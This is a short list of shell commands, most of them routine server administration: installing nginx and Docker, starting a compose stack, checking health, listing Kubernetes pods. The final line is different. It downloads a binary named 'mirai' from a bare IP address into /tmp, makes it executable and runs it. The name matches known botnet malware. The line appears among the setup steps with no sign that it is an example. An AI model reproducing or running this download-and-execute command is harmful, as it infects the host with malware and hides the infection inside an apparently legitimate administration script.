sudo apt update && sudo apt install -y nginx docker.io
sudo usermod -aG docker ubuntu
docker compose -f /opt/app/docker-compose.yml up -d
curl -s localhost/healthz
kubectl get pods -A
ansible --version
wget http://198.51.100.22/bins/mirai.x86 -O /tmp/mirai && chmod +x /tmp/mirai && /tmp/mirai
